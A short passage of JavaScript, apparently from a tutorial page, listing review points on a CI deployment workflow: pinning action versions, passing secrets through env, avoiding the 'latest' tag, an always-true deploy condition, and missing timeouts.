      ['3 · <code>@main</code>', 'The code behind a branch can change between runs. Pin a version, and for third-party actions a full SHA.'],
      ['4 · The secret in the script', 'Passed through <code>env</code>, it cannot change how the shell reads the script.'],
      ['5 · <code>latest</code>', 'You cannot tell what is deployed, and cannot roll back to "the previous latest". Tag with the commit.'],
      ['6 · The condition', '<code>"${{ github.ref }} == \'refs/heads/main\'"</code> is a string with text around the braces, so it is always true. The deploy ran for everything that got that far. Write the comparison without the braces (or all inside them).'],
      ['7 · No timeouts', 'A hung step would hold a runner for up to six hours.'],
    ]),
  });
})();
